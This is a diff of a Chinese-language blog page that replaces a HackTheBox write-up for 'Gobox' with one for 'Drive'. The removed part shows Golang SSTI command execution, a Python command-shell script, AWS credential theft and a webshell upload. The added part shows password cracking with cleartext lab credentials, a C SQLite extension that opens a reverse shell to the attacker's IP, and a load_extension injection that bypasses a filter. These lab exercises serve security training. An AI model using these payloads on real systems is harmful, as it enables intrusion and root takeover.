@@ -16,47 +16,40 @@
   <meta name="author" content="Aurey7">
   <meta name="keywords" content="">
   
-    <meta name="description" content="整体还是挺难的，但我不太喜欢最后的tricks Cloud Tracck算是打完了，最后一台挣扎了一段时间，后面看writeup需要逆向的知识，明天VIP就过期了，没时间研究哩  信息收集端口扫描 4566直接访问会403 80和8080目录爆破无果  GoLang SSTI GetShellhttp:&#x2F;&#x2F;10.10.11.113:8080&#x2F;forgot&#x2F; 尝试SSTI会502 这时候没招了，看了">
+    <meta name="description" content="Drive信息收集端口扫描 80端口 Web 站点这个发现一个客户的留言，感觉是一种提示。后面想着往越权的方向找其他用户的账号密码  越权漏洞获取账号密码经过一段时间的挖掘后，发现Reserve功能存在越权问题。可以Reverse别人的文件，之后就能看到文件的内容了  用Burpsuite遍历，发现账号密码和提示信息。 12martinXk4@KjyrYv8t194L!  这里提示会备份数据库到">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Gobox-HackTheBox">
-<meta property="og:url" content="http://aurey7.github.io.git/2023/09/19/Gobox-HackTheBox/index.html">
+<meta property="og:title" content="Drive HackTheBox">
+<meta property="og:url" content="http://aurey7.github.io.git/2023/10/22/Drive-HackTheBox/index.html">
 <meta property="og:site_name" content="Aurey7&#39;s Blog">
-<meta property="og:description" content="整体还是挺难的，但我不太喜欢最后的tricks Cloud Tracck算是打完了，最后一台挣扎了一段时间，后面看writeup需要逆向的知识，明天VIP就过期了，没时间研究哩  信息收集端口扫描 4566直接访问会403 80和8080目录爆破无果  GoLang SSTI GetShellhttp:&#x2F;&#x2F;10.10.11.113:8080&#x2F;forgot&#x2F; 尝试SSTI会502 这时候没招了，看了">
+<meta property="og:description" content="Drive信息收集端口扫描 80端口 Web 站点这个发现一个客户的留言，感觉是一种提示。后面想着往越权的方向找其他用户的账号密码  越权漏洞获取账号密码经过一段时间的挖掘后，发现Reserve功能存在越权问题。可以Reverse别人的文件，之后就能看到文件的内容了  用Burpsuite遍历，发现账号密码和提示信息。 12martinXk4@KjyrYv8t194L!  这里提示会备份数据库到">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_0xQ93xlPKu.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xDdwc3QHf1.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Z58mGZb4qP.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Jg3jU95cY-.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_uVyEAaVezc.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aGxsWDC77s.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NeW8TdHd2z.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NhLjEMR4go.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vuFZzs9Huh.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ch-_L30F_1.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5OOqbnxcyH.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_G_NcXscFcg.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_d_qS9jLOWI.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_v6Rnw4jFFA.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Vx0xCUvLMw.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-AWDbvfHNg.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IqX3Kzd0PM.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Z1QdpTH-qt.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cgznJHjLAf.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IQyWFfXzMQ.png">
-<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_923y1bFRx7.png">
-<meta property="article:published_time" content="2023-09-19T14:34:02.000Z">
-<meta property="article:modified_time" content="2023-09-19T14:36:03.494Z">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%201.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%202.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%203.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%204.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%205.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%206.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%207.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%208.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%209.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%2010.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%2011.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%2012.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%2013.png">
+<meta property="og:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%2014.png">
+<meta property="article:published_time" content="2023-10-22T02:37:59.000Z">
+<meta property="article:modified_time" content="2023-10-22T02:41:29.294Z">
 <meta property="article:author" content="Aurey7">
 <meta property="article:tag" content="HackTheBox">
-<meta property="article:tag" content="Cloud Native Security">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_0xQ93xlPKu.png">
+<meta name="twitter:image" content="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Gobox-HackTheBox - Aurey7&#39;s Blog</title>
+  <title>Drive HackTheBox - Aurey7&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -234,7 +227,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Gobox-HackTheBox"></span>
+            <span id="subtitle" data-typed-text="Drive HackTheBox"></span>
           
         </div>
 
@@ -245,8 +238,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-09-19 22:34" pubdate>
-          2023年9月19日 晚上
+        <time datetime="2023-10-22 10:37" pubdate>
+          2023年10月22日 上午
         </time>
       </span>
     
@@ -257,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.7k 字
+          3k 字
         
       </span>
     
@@ -268,7 +261,7 @@
         
         
         
-          15 分钟
+          25 分钟
         
       </span>
     
@@ -314,58 +307,56 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Gobox-HackTheBox</h1>
+            <h1 style="display: none">Drive HackTheBox</h1>
             
             
               <div class="markdown-body">
                 
-                <p>整体还是挺难的，但我不太喜欢最后的tricks</p>
-<p>Cloud Tracck算是打完了，最后一台挣扎了一段时间，后面看writeup需要逆向的知识，明天VIP就过期了，没时间研究哩</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_0xQ93xlPKu.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xDdwc3QHf1.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>4566直接访问会403</p>
-<p>80和8080目录爆破无果</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Z58mGZb4qP.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="GoLang-SSTI-GetShell"><a href="#GoLang-SSTI-GetShell" class="headerlink" title="GoLang SSTI GetShell"></a>GoLang SSTI GetShell</h3><p><a target="_blank" rel="noopener" href="http://10.10.11.113:8080/forgot/" title="http://10.10.11.113:8080/forgot/">http://10.10.11.113:8080/forgot/</a> 尝试SSTI会502</p>
-<p>这时候没招了，看了一下writeup，原来确实是SSTI，只不过是Golang的。又学到了</p>
-<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1286">https://forum.butian.net/share/1286</a></p>
-<p>返回模板中的所有内容</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Jg3jU95cY-.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>看起来非常像账号密码，登陆后直接爆出源代码</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_uVyEAaVezc.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>很明显送了个RCE</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">func (u User) DebugCmd (test string) string &#123;<br>  ipp := strings.Split(test, <span class="hljs-string">&quot; &quot;</span>)<br>  <span class="hljs-built_in">bin</span> := strings.Join(ipp[:<span class="hljs-number">1</span>], <span class="hljs-string">&quot; &quot;</span>)<br>  args := strings.Join(ipp[<span class="hljs-number">1</span>:], <span class="hljs-string">&quot; &quot;</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(args) &gt; <span class="hljs-number">0</span>&#123;<br>    out, _ := <span class="hljs-built_in">exec</span>.Command(<span class="hljs-built_in">bin</span>, args).CombinedOutput()<br>    <span class="hljs-keyword">return</span> string(out)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    out, _ := <span class="hljs-built_in">exec</span>.Command(<span class="hljs-built_in">bin</span>).CombinedOutput()<br>    <span class="hljs-keyword">return</span> string(out)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-<p>成功执行命令</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aGxsWDC77s.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="自制Shell"><a href="#自制Shell" class="headerlink" title="自制Shell"></a>自制Shell</h3><p>能执行的命令相当有限，反弹Shell一直失败。以为是Glang SSTI的知识盲区，又去看了一下writeup。大伙也反弹不了，通过Python脚本做了个方便执行命令的Shell</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">from cmd import Cmd<br>import requests<br>import re<br><br>class Term(Cmd):<br>    prompt = <span class="hljs-string">&quot;pythonshell&gt; &quot;</span><br>    pattern = re.compile(r<span class="hljs-string">&#x27;Email Sent To: (.*?)\s+&lt;button class=&quot;btn btn-primary&#x27;</span>, re.DOTALL)<br>    def default(self, args):<br>        cmd = args.replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>)<br>        res = requests.post(<span class="hljs-string">&#x27;http://10.10.11.113:8080/forgot/&#x27;</span>, data = &#123;<span class="hljs-string">&quot;email&quot;</span>:f<span class="hljs-string">&#x27;&#123;&#123;&#123;&#123; .DebugCmd &quot;&#123;cmd&#125;&quot; &#125;&#125;&#125;&#125;&#x27;</span>&#125;)<br>        try:<br>            res = self.pattern.search(res.text).group(1)<br>            <span class="hljs-built_in">print</span>(res)<br>        except Exception as e:<br>            <span class="hljs-built_in">print</span>(e)<br><br>    def do_exit(self, args):<br>        <span class="hljs-built_in">return</span> True<br><br>term = Term()<br>term.cmdloop()<br></code></pre></td></tr></table></figure>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NeW8TdHd2z.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>能执行的命令相当有限</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NhLjEMR4go.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>在<code>/root</code>下发现了aws凭据</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vuFZzs9Huh.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a>容器逃逸</h3><p>看到s3里的内容，就是主站的内容。而且是PHP，可以试试上传个Webshell</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ch-_L30F_1.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>写个经典的🐎，再上传上去</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5OOqbnxcyH.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_G_NcXscFcg.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>Ubuntu用户的user flag被设置成644，导致任何人都可以读</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_d_qS9jLOWI.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h3 id="提权阶段"><a href="#提权阶段" class="headerlink" title="提权阶段"></a>提权阶段</h3><p>4566端口之前访问会直接403，这里存在一个硬编码token</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_v6Rnw4jFFA.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>又留意到下面这个command on；没见过这种配置，感觉是个非正常行为。</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Vx0xCUvLMw.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<h4 id="Nginx后门提权"><a href="#Nginx后门提权" class="headerlink" title="Nginx后门提权"></a>Nginx后门提权</h4><p>留意到nginx使用root用户运行</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-AWDbvfHNg.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>modules-enabled 目录下发现 backdoor.conf</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IqX3Kzd0PM.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>了解了一下真是后门</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Z1QdpTH-qt.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>按照项目信息直接执行没有回复</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cgznJHjLAf.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p>又看了下writeup，strings发现ippsec.run。才能执行命令</p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IQyWFfXzMQ.png" srcset="/img/loading.gif" lazyload alt=""></p>
-<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_923y1bFRx7.png" srcset="/img/loading.gif" lazyload alt=""></p>
+                <h1 id="Drive"><a href="#Drive" class="headerlink" title="Drive"></a>Drive</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<h3 id="80端口-Web-站点"><a href="#80端口-Web-站点" class="headerlink" title="80端口 Web 站点"></a>80端口 Web 站点</h3><p>这个发现一个客户的留言，感觉是一种提示。后面想着往越权的方向找其他用户的账号密码</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%201.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<h3 id="越权漏洞获取账号密码"><a href="#越权漏洞获取账号密码" class="headerlink" title="越权漏洞获取账号密码"></a>越权漏洞获取账号密码</h3><p>经过一段时间的挖掘后，发现Reserve功能存在越权问题。可以Reverse别人的文件，之后就能看到文件的内容了</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%202.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>用Burpsuite遍历，发现账号密码和提示信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin<br>Xk4@KjyrYv8t194L!<br></code></pre></td></tr></table></figure>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%203.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>这里提示会备份数据库到 <code>/var/www/backups</code> 目录下</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%204.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>根据上面的信息找到了数据库文件</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%205.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>破解db.sqlite3里的SHA1得到账户密码，尝试SSH失败</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomHands:john316<br></code></pre></td></tr></table></figure>
+<h3 id="gitea-泄露解压密码"><a href="#gitea-泄露解压密码" class="headerlink" title="gitea 泄露解压密码"></a>gitea 泄露解压密码</h3><p>还记得端口扫描中被filtered的3000端口吗。进程中也发现了gitea，它的默认端口就是3000</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%206.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>快速的端口转发</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Kali：ssh -L 3000:127.0.0.1:3000 martin@drive.htb -fN<br>Windows：ssh -L 3000:127.0.0.1:3000 admin@remoteIP -fN<br></code></pre></td></tr></table></figure>
+<p>利用账户名密码登录 gitea</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin@drive.htb<br>Xk4@KjyrYv8t194L!<br></code></pre></td></tr></table></figure>
+<p>获得备份密码 <code>H@ckThisP@ssW0rDIfY0uC@n:)</code></p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%207.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>解压备份文件，尝试爆破SHA1</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%208.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>爆出几个密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">johniscool<br>johnmayer7<br>john316<br></code></pre></td></tr></table></figure>
+<p>尝试登录 ssh 成功</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%209.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="反编译-doodleGrive-cli"><a href="#反编译-doodleGrive-cli" class="headerlink" title="反编译 doodleGrive-cli"></a>反编译 doodleGrive-cli</h3><p>linpeas 看了一下，其他信息都差不多。提权应该要在这个 doodleGrive-cli 下功夫了</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%2010.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>反编译看一下，通过这个账号密码可以使用 cli 里的功能，值得注意的是，这里的功能都是以 root 权限执行的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">moriarty<br>findMeIfY0uC@nMr.Holmz!<br></code></pre></td></tr></table></figure>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%2011.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>跟进一下 main_menu() 函数中调用的 activate_user_account() 函数存在命令注入问题，这个程序又是以 root 运行的，我们可以以此提权</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%2012.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>但一番经过尝试，我没能直接执行系统命令。activate_user_account() 中存在字符过滤函数sanitize_string()，会将 local_29 中的字符过滤掉，也就是过滤了 <code>\ &#123; / | space &#39;</code>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">void sanitize_string(char *param_1)<br><br>&#123;<br>  bool bVar1;<br>  size_t sVar2;<br>  long in_FS_OFFSET;<br>  int local_3c;<br>  int local_38;<br>  uint local_30;<br>  undefined8 local_29;<br>  undefined local_21;<br>  long local_20;<br>  <br>  local_20 = *(long *)(in_FS_OFFSET + 0x28);<br>  local_3c = 0;<br>  local_29 = 0x5c7b2f7c20270a00;<br>  local_21 = 0x3b;<br>  local_38 = 0;<br>  <span class="hljs-keyword">do</span> &#123;<br>    sVar2 = strlen(param_1);<br>    <span class="hljs-keyword">if</span> (sVar2 &lt;= (ulong)(long)local_38) &#123;<br>      param_1[local_3c] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>      <span class="hljs-keyword">if</span> (local_20 != *(long *)(in_FS_OFFSET + 0x28)) &#123;<br>                    /* WARNING: Subroutine does not <span class="hljs-built_in">return</span> */<br>        __stack_chk_fail();<br>      &#125;<br>      <span class="hljs-built_in">return</span>;<br>    &#125;<br>    bVar1 = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span> (local_30 = 0; local_30 &lt; 9; local_30 = local_30 + 1) &#123;<br>      <span class="hljs-keyword">if</span> (param_1[local_38] == *(char *)((long)&amp;local_29 + (long)(int)local_30)) &#123;<br>        bVar1 = <span class="hljs-literal">true</span>;<br>        <span class="hljs-built_in">break</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!bVar1) &#123;<br>      param_1[local_3c] = param_1[local_38];<br>      local_3c = local_3c + 1;<br>    &#125;<br>    local_38 = local_38 + 1;<br>  &#125; <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> );<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="sqlite-load-extension-提权"><a href="#sqlite-load-extension-提权" class="headerlink" title="sqlite load_extension 提权"></a>sqlite load_extension 提权</h3><p>后面想到了sqlite SQL 注入 <strong><strong>load_extension</strong></strong> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">/* Add your header comment here */<br><span class="hljs-comment">#include &lt;sqlite3ext.h&gt; /* Do not use &lt;sqlite3.h&gt;! */</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/types.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/socket.h&gt;</span><br><span class="hljs-comment">#include &lt;arpa/inet.h&gt;</span><br><span class="hljs-comment">#include &lt;signal.h&gt;</span><br><span class="hljs-comment">#include &lt;dirent.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/stat.h&gt;</span><br>SQLITE_EXTENSION_INIT1<br><br>/* Insert your extension code here */<br>int tcp_port = 7777;<br>char *ip = <span class="hljs-string">&quot;10.10.14.67&quot;</span>;<br><br><span class="hljs-comment">#ifdef _WIN32</span><br>__declspec(dllexport)<br><span class="hljs-comment">#endif</span><br><br>int sqlite3_extension_init(<br>  sqlite3 *db, <br>  char **pzErrMsg, <br>  const sqlite3_api_routines *pApi<br>)&#123;<br>  int rc = SQLITE_OK;<br>  SQLITE_EXTENSION_INIT2(pApi);<br>  <br>  int fd;<br>  <span class="hljs-keyword">if</span> ( fork() &lt;= 0)&#123;<br>    struct sockaddr_in addr;<br>    addr.sin_family = AF_INET;<br>    addr.sin_port = htons(tcp_port);<br>    addr.sin_addr.s_addr = inet_addr(ip);<br><br>    fd = socket(AF_INET, SOCK_STREAM, 0);<br>    <span class="hljs-keyword">if</span> ( connect(fd, (struct sockaddr*)&amp;addr, sizeof(addr)) )&#123;<br>            <span class="hljs-built_in">exit</span>(0);<br>    &#125;<br><br>    dup2(fd, 0);<br>    dup2(fd, 1);<br>    dup2(fd, 2);<br>    execve(<span class="hljs-string">&quot;/bin/bash&quot;</span>, 0LL, 0LL);<br>&#125;<br>  <br>  <span class="hljs-built_in">return</span> rc;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>编译成 so 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -g -fPIC -shared shell.c -o t.so<br></code></pre></td></tr></table></figure>
+<p>进入doodleGrive-cli，选择5，用户名填写 <code>&quot;+load_extension(char(46,47,116))--</code>绕过过滤函数并加载so</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%2013.png" srcset="/img/loading.gif" lazyload alt="Untitled"></p>
+<p>即可绕过过滤函数，加载so文件反弹shell</p>
+<p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%2014.png" srcset="/img/loading.gif" lazyload alt="Untitled 14"></p>
 
                 
               </div>
@@ -374,13 +365,32 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Pentest/" class="category-chain-item">Pentest</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
   
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
         <a href="/tags/HackTheBox/">#HackTheBox</a>
-      
-        <a href="/tags/Cloud-Native-Security/">#Cloud Native Security</a>
       
     </div>
   
@@ -392,8 +402,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Gobox-HackTheBox</div>
